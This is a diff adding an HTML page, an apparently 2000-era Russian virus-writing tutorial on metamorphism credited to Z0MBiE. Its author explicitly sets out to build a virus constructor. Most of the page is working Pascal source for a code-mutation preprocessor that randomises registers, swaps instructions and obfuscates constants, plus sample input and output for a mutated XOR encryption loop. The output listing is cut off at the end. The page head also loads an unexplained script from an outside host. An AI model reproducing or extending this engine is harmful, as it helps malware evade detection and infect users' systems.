@@ -1,0 +1,668 @@
+<html>
+<head>
+<title>МЕТАМОРФИЗМ ч.1</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</head>
+<body bgcolor=#B0B0B0 text=#000000 link=#000080 alink=#000000 vlink=#000080>
+
+<h2 align=center>МЕТАМОРФИЗМ</h2>
+<h3 align=center>часть 1</h3>
+
+<p>Термины:
+<p>Метаморфизм -- генерация вирусом своего ассемблерного кода.
+
+<p>В этом тексте изложим некоторые мысли именно по поводу генерации нового
+кода.
+
+<p>Итак, надо научиться генерить код:
+<ul>
+<li>выполнящий определенные нужные нам действия
+<li>полиморфный
+<li>по возможности максимально похожий на код сгенеренный hll-компиляторами
+<li>минимально похожий на код используемый во всех известных вирусах
+</ul>
+
+<p>Два сгенеренных таким образом вируса могут различаться:
+<ul>
+<li>на уровне алгоритма
+<li>на уровне команд
+</ul>
+
+<p>Уровень алгоритма здесь означает примерно следующее:
+вирус состоит из "блоков", на каждый из которых имеется несколько
+вариантов, отличающихся по своей сути.
+Например переход в ring-0 через IDT либо GDT либо INT 2E либо VMM/...,
+заражение файлов в хеадер либо в последнюю секцию, и т.п.
+
+<p>Уровень команд означает что каждая "строка" псевдо-языка, в котором
+представлены такие алгоритмические блоки может быть представлена
+различными ассемблерными инструкциями,
+такие строки могут также иметь несколько вариантов,
+могут быть изменены и перемешаны.
+
+<p>Вот как это выглядит:
+
+<p>задача: вычислить выражение f(x)=10*sin(2*x)
+
+<pre>
+     ------------------------ уровень "алгоритма" ------------------->
+    |
+    |        f(x) = 10*sin(2*x)             f(x) = sin(x)*cos(x)*20
+    |
+    |        ВАРИАНТ 1                      ВАРИАНТ 2
+    |
+    |        t = x                          t = x
+ уровень     t = t * 2                      a = sin(t)
+ "команд"    t = sin(t)                     b = cos(t)
+    |        t = t * 10                     t = a * b
+    |                                       t = t * 20
+    |
+    |        ВАРИАНТ 3                      ВАРИАНТ 4
+    |
+    |        t = 2 * x                      b = cos(x)
+    |        a = sin(t)                     t = 20 * b
+    |        t = 10 * a                     a = sin(x)
+    |                                       t = t * a
+    
+</pre>
+
+<p>Очевидно, что пока еще нет возможности автоматически
+изменять программу на уровне алгоритма.
+Поэтому это ваше дело, сколько различных вариантов одних и тех же действий
+вы зададите, но одно ясно - чем больше, тем лучше.
+Далее мы будем рассматривать только уровень команд.
+
+<p>Итак, вот мы выбрали один из алоритмов.
+Вопросы тут такие:
+<ul>
+<li>каким образом его реально закодировать и
+<li>как потом из этих данных получить ассемблерный код.
+</ul>
+
+<p>Генерацию именно ассемблерного кода пока оставим, а все инструкции
+будем представлять в виде текста.
+Короче говоря, пишем вирусный конструктор.
+Чтобы потом из конструктора сделать компилятор, вместо writeln('nop')
+(для наглядности будем юзать паскаль) надо просто генерить сооветствующие
+опкоды.
+
+<p>Далее будем руководствоваться тем, что в алгоритме не используются регистры,
+а только переменные.
+А вот операции с этими переменными осуществляются уже посредством регистров.
+Это дает нам возможность:
+<ul>
+<li>использовать фиксированный набор команд (как и поступают hll-компиляторы)
+<li>[по желанию] использовать огромное количество мусора изменяющего регистры
+<li>сгенеренный таким образом код выглядит достаточно хуево и плохо дисассемблируется
+</ul>
+
+<p>Итак, на уровне переменных нам достаточно следующих основных команд-макросов:
+
+<p>Уровень переменных:
+<pre><font color=#000040>
+        mov     v, c
+        mov     v1, [v2]
+        mov     [v1], v2
+        cmd     v1, v2     ; cmd = add/sub/xor/rol/ror
+</font></pre>
+
+<p>Уровень регистров: (используются предыдущими макросами)
+<pre><font color=#000040>
+        mov     v, c
+                mov     r, c
+                mov     v, r
+        mov     v1, [v2]
+                mov     r2, v2
+                mov     r1, [r2]
+                mov     v1, r1
+        mov     [v1], v2
+                mov     r1, v1
+                mov     r2, v2
+                mov     [r1], r2
+        mov     v1, v2
+                mov     r, v2
+                mov     v1, r
+        cmd     v1, v2
+                mov     r1, v1     mov r1, v1     mov r2, v2
+                mov     r2, v2     cmd r1, v2     cmd v1, r2
+                cmd     r1, r2     mov v1, r1
+                mov     v1, r1
+        mov     r, v
+                mov     r1, offset v      mov r, v
+                mov     r, [r1]
+        mov     v, r
+                mov     r1, offset v      mov v, r
+                mov     [r1], r
+        mov     r, c
+                ...
+</font></pre>
+
+<p>Чтобы продемонстрировать уровни команд и регистров, напишем
+такую вот несложную программу-препроцессор: <a href=#asmxpas>asmx.pas</a>
+Вызывается программа так: asmx.exe <a href=#1src>1.src</a> <a href=#1asm>1.asm</a>
+В конце текста приведен исходник и что получается в результате.
+
+<p>Написав с использованием таких вещей вирус можно уже сделать
+нечто похожее на конструктор, правда без "алгоритмического" уровня.
+
+<p>Итак, следующим шагом является представление всего вируса в подобном
+псевдо-коде с различными вариантами алгоритмов и замена в нижеприведенном
+примере генерации текста на геренацию опкодов. Но это в следующий раз. ;-)
+
+<p align=center>* * *</p>
+
+<p align=right>(x) 2000 Z0MBiE, <i><a href="http://z0mbie.host.sk">http://z0mbie.host.sk</a></i></p>
+
+
+
+
+<pre>
+<font color=#000040>
+
+<a name=asmxpas>
+---[begin ASMX.PAS]---------------------------------------------------------
+{$A+,B-,D+,E-,F-,G+,I-,L+,N+,O-,P-,Q-,R-,S-,T-,V+,X+,Y+}
+{$M 16384,0,0}
+
+uses crt, dos;
+
+procedure outcmd(c,d,s:string); forward;
+
+procedure reg_alloc(var r:string); forward;
+procedure reg_free(var r:string); forward;
+procedure reg_xchg(var r:string); forward;
+
+procedure cmd_r_r(cmd,r1,r2:string); forward;
+procedure cmd_v_r(cmd,v,r:string); forward;
+procedure cmd_r_v(cmd,r,v:string); forward;
+procedure mov_x_x(x1,x2:string); forward;
+procedure mov_x_c(x,c:string); forward;
+procedure mov_r_c(r,c:string); forward;
+procedure mov_r_offsv(r,v:string); forward;
+procedure mov_r_memr(r1,r2:string); forward;
+procedure mov_memr_r(r1,r2:string); forward;
+procedure mov_r_v(r,v:string); forward;
+procedure mov_v_r(v,r:string); forward;
+
+procedure mov_v_c(v,c:string); forward;
+procedure mov_v_memv(v1,v2:string); forward;
+procedure mov_memv_v(v1,v2:string); forward;
+procedure cmd_v_v(cmd,v1,v2:string); forward;
+
+var
+  infile, outfile : text;
+
+{ outcmd: здесь легко реализуется добавление инструкций в список и
+  последующее их перемешивание }
+procedure outcmd(c,d,s:string);
+  begin
+    if (d='') or (s='') then
+      writeln(outfile,c,' ',d,s)
+    else
+      writeln(outfile,c,' ',d,', ',s);
+  end;
+
+
+const
+  hexchar:array[0..15] of char = '0123456789ABCDEF';
+
+const
+  regtotal = 8;
+  regcount:integer=regtotal;
+  regused:array[1..regtotal] of integer = (0,0,0,0,0,0,0,0);
+  regname:array[1..regtotal] of string[3] =
+    ('eax','ecx','edx','ebx','esp','ebp','esi','edi');
+
+{ пометить регистр как используемый }
+procedure reg_use(r:string);
+  var
+    i:integer;
+  begin
+    for i:=1 to regtotal do
+      if regname[i]=r then
+        if regused[i]=0 then
+        begin
+          regused[i]:=1;
+          dec(regcount);
+          exit;
+        end;
+  end;
+
+{ рандомно выделить регистр }
+procedure reg_alloc(var r:string);
+  var
+    i:integer;
+  begin
+    if regcount=0 then halt(1);
+    repeat
+      i:=1+random(regtotal);
+    until regused[i]=0;
+    r:=regname[i];
+    regused[i]:=1;
+    dec(regcount);
+  end;
+
+{ оснвободить регистр }
+procedure reg_free(var r:string);
+  var
+    i:integer;
+  begin
+    if regcount=0 then halt(2);
+    for i:=1 to regtotal do
+      if regname[i]=r then
+      begin
+        if regused[i]<>1 then halt(4);
+        regused[i]:=0;
+        inc(regcount);
+        r:='<empty>';
+        exit;
+      end;
+    halt(3);
+  end;
+
+procedure mov_x_x(x1,x2:string);  { x1=v/r, x2=v/r, x1!=v||x2!=v }
+  begin
+    case random(5) of
+      0: begin
+           outcmd('push','',x2);
+           outcmd('pop',x1,'');
+         end;
+      else
+         begin
+           outcmd('mov',x1,x2);
+         end;
+    end;
+  end;
+
+{ (рандомно) пере-выделить регистр, то бишь изменить его на другой }
+procedure reg_xchg(var r:string);
+  var
+    r1:string;
+  begin
+    if regcount=0 then exit;
+    if random(3)<>0 then exit;
+    reg_alloc(r1);
+    mov_x_x(r1,r);
+    reg_free(r);
+    r:=r1;
+  end;
+
+procedure cmd_r_r(cmd,r1,r2:string);
+  begin
+    outcmd(cmd,r1,r2);
+  end;
+procedure cmd_v_r(cmd,v,r:string);
+  begin
+    outcmd(cmd,v,r);
+  end;
+procedure cmd_r_v(cmd,r,v:string);
+  begin
+    outcmd(cmd,r,v);
+  end;
+
+procedure mov_x_c(x,c:string);  { x=v/r }
+  var
+    i:integer;
+    l:string;
+  begin
+    l := '0'; for i:=0 to 7 do l:=l+hexchar[random(16)]; l:=l+'h';
+    case random(5) of
+      0: begin
+           mov_x_c(x,'('+c+')+'+l);
+           outcmd('sub',x,l);
+         end;
+      1: begin
+           mov_x_c(x,'('+c+')-'+l);
+           outcmd('add',x,l);
+         end;
+      else
+         begin
+           mov_x_x(x,c);
+         end;
+    end;
+  end;
+
+procedure mov_r_c(r,c:string);
+  begin
+    mov_x_c(r,c);
+  end;
+
+procedure mov_r_offsv(r,v:string);
+  begin
+    outcmd('lea',r,v);          { mov r, offset v }
+  end;
+
+procedure mov_r_memr(r1,r2:string);
+  begin
+    mov_x_x(r1,'dword ptr ['+r2+']');     { mov r1, [r2] }
+  end;
+procedure mov_memr_r(r1,r2:string);
+  begin
+    mov_x_x('dword ptr ['+r1+']',r2);     { mov [r1], r2 }
+  end;
+
+procedure mov_r_v(r,v:string);
+  var
+    r1:string;
+  begin
+    case random(3) of
+      0: begin
+           mov_x_x(r,v);         { mov r, v }
+         end;
+      1: begin
+           reg_alloc(r1);
+           mov_r_offsv(r1,v);    { mov r1, offset v }
+           reg_xchg(r1);
+           mov_r_memr(r,r1);     { mov r, [r1] }
+           reg_free(r1);
+         end;
+      2: begin
+           mov_r_offsv(r,v);     { mov r, offset v }
+           mov_r_memr(r,r);      { mov r, [r] }
+         end;
+    end;
+  end;
+
+procedure mov_v_r(v,r:string);
+  var
+    r1:string;
+  begin
+    case random(2) of
+      0: begin
+           mov_x_x(v,r);       { mov v, r }
+         end;
+      1: begin
+           reg_alloc(r1);
+           mov_r_offsv(r1,v);  { mov r1, offset v }
+           reg_xchg(r1);
+           mov_memr_r(r1,r);   { mov [r1], r }
+           reg_free(r1);
+         end;
+    end;
+  end;
+
+procedure mov_v_c(v,c:string);
+  var
+    r:string;
+  begin
+    case random(2) of
+      0: begin
+           mov_x_c(v,c);  { mov v, c }
+         end;
+      1: begin
+           reg_alloc(r);
+           mov_r_c(r,c);  { mov r, c }
+           reg_xchg(r);
+           mov_v_r(v,r);  { mov v, r }
+           reg_free(r);
+         end;
+    end;
+  end;
+
+procedure mov_v_memv(v1,v2:string);
+  var
+    r1,r2:string;
+  begin
+    reg_alloc(r2);
+    mov_r_v(r2,v2);     { mov r2, v2   }
+    reg_xchg(r2);
+    reg_alloc(r1);
+    mov_r_memr(r1,r2);  { mov r1, [r2] }
+    reg_free(r2);
+    reg_xchg(r1);
+    mov_v_r(v1,r1);     { mov v1, r1   }
+    reg_free(r1);
+  end;
+
+procedure mov_memv_v(v1,v2:string);
+  var
+    i,j:integer;
+    r1,r2:string;
+  begin
+    j:=random(2);
+    for i:=j to j+1 do
+      if odd(i) then begin
+        reg_alloc(r1);
+        mov_r_v(r1,v1);     { mov r1, v1 }
+        reg_xchg(r1);
+      end else begin
+        reg_alloc(r2);
+        mov_r_v(r2,v2);     { mov r2, v2 }
+        reg_xchg(r2);
+      end;
+    mov_memr_r(r1,r2);    { mov [r1], r2 }
+    reg_free(r1);
+    reg_free(r2);
+  end;
+
+procedure cmd_v_v(cmd,v1,v2:string);
+  var
+    i,j:integer;
+    r1,r2:string;
+  begin
+    case random(3) of
+      0: begin
+           reg_alloc(r2);
+           mov_r_v(r2,v2);     { mov r2,v2 }
+           reg_xchg(r2);
+           cmd_v_r(cmd,v1,r2); { cmd v1,r2 }
+           reg_free(r2);
+         end;
+      1: begin
+           reg_alloc(r1);
+           mov_r_v(r1,v1);     { mov r1,v1 }
+           reg_xchg(r1);
+           cmd_r_v(cmd,r1,v2); { cmd r1,v2 }
+           reg_xchg(r1);
+           mov_v_r(v1,r1);     { mov v1,r1 }
+           reg_free(r1);
+         end;
+      2: begin
+           j:=random(2);
+           for i:=j to j+1 do
+             if odd(i) then begin
+               reg_alloc(r1);
+               mov_r_v(r1,v1);     { mov r1, v1 }
+               reg_xchg(r1);
+             end else begin
+               reg_alloc(r2);
+               mov_r_v(r2,v2);     { mov r2, v2 }
+               reg_xchg(r2);
+             end;
+           cmd_r_r(cmd,r1,r2); { cmd r1, r2 }
+           reg_free(r2);
+           reg_xchg(r1);
+           mov_v_r(v1,r1);     { mov v1, r1 }
+           reg_free(r1);
+         end;
+    end;
+  end;
+
+procedure process_string(t:string);
+  var
+    p1,p2,p3,p4:string;
+  begin
+    writeln(outfile,';; ',t);
+    move(t,mem[prefixseg:$80],128);
+    p1:=paramstr(1);
+    p2:=paramstr(2);
+    p3:=paramstr(3);
+    p4:=paramstr(4);
+    if p1='reg_use'    then reg_use(p2);
+    if p1='reg_free'   then reg_free(p2);
+    if p1='mov_v_c'    then mov_v_c(p2,p3);
+    if p1='mov_v_memv' then mov_v_memv(p2,p3);
+    if p1='mov_memv_v' then mov_memv_v(p2,p3);
+    if p1='cmd_v_v'    then cmd_v_v(p2,p3,p4);
+    if p1='mov_v_r'    then mov_v_r(p2,p3);
+    if p1='mov_r_v'    then mov_r_v(p2,p3);
+  end;
+
+var
+  s:string;
+
+begin
+  if paramcount<>2 then
+  begin
+    writeln('syntax: ASMX infile outfile');
+    halt;
+  end;
+
+  randomize;
+  clrscr;
+
+  writeln('asmx: ',paramstr(1),' --> ',paramstr(2));
+
+  assign(infile, paramstr(1));
+  reset(infile);
+  if ioresult<>0 then halt(10);
+  assign(outfile, paramstr(2));
+  rewrite(outfile);
+  if ioresult<>0 then halt(11);
+
+  while not eof(infile) do
+  begin
+    readln(infile, s);
+    if s[1]<>'#' then begin
+      writeln(outfile, s);
+    end else begin
+      delete(s,1,1);
+      process_string(s);
+    end;
+  end;
+
+  close(outfile);
+  close(infile);
+end.
+---[end ASMX.PAS]-----------------------------------------------------------
+
+<a name=1src>
+---[begin 1.SRC]------------------------------------------------------------
+
+; текст для обработки препроцессором
+
+; input: ESI=buffer
+;        ECX=size
+
+#reg_use esp
+#reg_use ebp
+
+encrypt:
+                        sub     esp, 20
+
+arg_index               =       dword ptr [esp+0]
+arg_count               =       dword ptr [esp+4]
+arg_4                   =       dword ptr [esp+8]
+arg_a                   =       dword ptr [esp+12]
+arg_b                   =       dword ptr [esp+16]
+
+#                       reg_use  esi
+#                       reg_use  ecx
+#                       mov_v_r  arg_index  esi
+#                       mov_v_r  arg_count  ecx
+#                       reg_free esi
+#                       reg_free ecx
+
+__cycle:
+#                       mov_v_memv   arg_a     arg_index
+#                       mov_v_c      arg_b     0FFFFFFFFh
+#                       cmd_v_v      xor       arg_a         arg_b
+#                       mov_memv_v   arg_index arg_a
+
+#                       mov_v_c  arg_4  4
+#                       cmd_v_v  add    arg_index     arg_4
+#                       cmd_v_v  sub    arg_count     arg_4
+                        jnc      __cycle
+
+                        add     esp, 20
+                        ret
+---[end 1.SRC]--------------------------------------------------------------
+
+<a name=1asm>
+---[begin 1.ASM]------------------------------------------------------------
+
+; результат работы препроцессора
+
+; input: ESI=buffer
+;        ECX=size
+
+;; reg_use esp
+;; reg_use ebp
+
+encrypt:
+                        sub     esp, 20
+
+arg_index               =       dword ptr [esp+0]
+arg_count               =       dword ptr [esp+4]
+arg_4                   =       dword ptr [esp+8]
+arg_a                   =       dword ptr [esp+12]
+arg_b                   =       dword ptr [esp+16]
+
+;;                        reg_use  esi
+;;                        reg_use  ecx
+;;                        mov_v_r  arg_index  esi
+push esi
+pop arg_index
+;;                        mov_v_r  arg_count  ecx
+mov arg_count, ecx
+;;                        reg_free esi
+;;                        reg_free ecx
+
+__cycle:
+;;                        mov_v_memv   arg_a     arg_index
+mov esi, arg_index
+mov ecx, dword ptr [esi]
+push ecx
+pop arg_a
+;;                        mov_v_c      arg_b     0FFFFFFFFh
+mov esi, ((((0FFFFFFFFh)-0EC1AAA3Fh)+0BFBE44BBh)+03B0F2183h)+0F48E7CC5h
+sub esi, 0F48E7CC5h
+sub esi, 03B0F2183h
+sub esi, 0BFBE44BBh
+add esi, 0EC1AAA3Fh
+mov edx, esi
+lea esi, arg_b
+mov edi, esi
+mov dword ptr [edi], edx
+;;                        cmd_v_v      xor       arg_a         arg_b
+lea ecx, arg_a
+mov ecx, dword ptr [ecx]
+xor ecx, arg_b
+mov arg_a, ecx
+;;                        mov_memv_v   arg_index arg_a
+lea ecx, arg_index
+mov ebx, ecx
+push dword ptr [ebx]
+pop edi
+mov edx, edi
+lea ecx, arg_a
+mov esi, ecx
+mov eax, dword ptr [esi]
+mov dword ptr [edx], eax
+
+;;                        mov_v_c  arg_4  4
+mov ecx, ((4)-0EC5AF651h)-0EBD0C63Fh
+add ecx, 0EBD0C63Fh
+add ecx, 0EC5AF651h
+mov arg_4, ecx
+;;                        cmd_v_v  add    arg_index     arg_4
+lea eax, arg_4
+mov eax, dword ptr [eax]
+push eax
+pop edx
+mov ebx, arg_index
+add ebx, edx
+lea eax, arg_index
+mov dword ptr [eax], ebx
+;;                        cmd_v_v  sub    arg_count     arg_4
+lea edx, arg_count
+push dword ptr [edx]
+pop ecx
+sub ecx, arg_4
+mov esi, ecx
+mov arg_count, esi
+                        jnc      __cycle
+
+                        add     esp, 20
+                        ret
+---[end 1.A
